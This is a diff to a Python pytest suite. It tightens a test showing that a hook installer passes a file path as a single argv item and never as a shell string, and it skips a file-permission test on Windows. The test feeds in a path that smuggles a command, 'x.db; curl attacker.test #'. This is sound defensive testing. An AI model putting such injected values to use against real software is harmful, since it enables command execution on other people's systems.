@@ -10,6 +10,7 @@ import json
 import os
 import sqlite3
 import stat
+import sys
 from pathlib import Path
 
 import pytest
@@ -411,11 +412,12 @@ def test_hook_installer_does_not_build_injectable_shell_strings(tmp_path: Path) 
 
     nasty = tmp_path / "x.db; curl attacker.test #"
     entry = install_hooks(tmp_path / "hooks.json", "hermes", nasty)
-    serialized = json.dumps(entry)
-    assert "curl attacker.test" not in serialized.replace(str(nasty), "")
     for command in entry.values():
         assert isinstance(command, list)
         assert str(nasty) in command
+        # The hostile-looking path is one inert argv item, never a shell string.
+        assert command.count(str(nasty)) == 1
+        assert all(token not in {"sh", "bash", "cmd", "powershell"} for token in command)
 
 
 # --------------------------------------------------------------------------- C4
@@ -600,6 +602,7 @@ def test_briefing_refuses_to_silently_drop_critical_sections(tmp_path: Path) -> 
 # --------------------------------------------------------------------------- L1
 
 
+@pytest.mark.skipif(sys.platform == "win32", reason="POSIX mode bits are not enforced on Windows")
 def test_database_file_is_not_world_readable(tmp_path: Path) -> None:
     """L1: mission data was 0644 while capsules were 0600."""
 
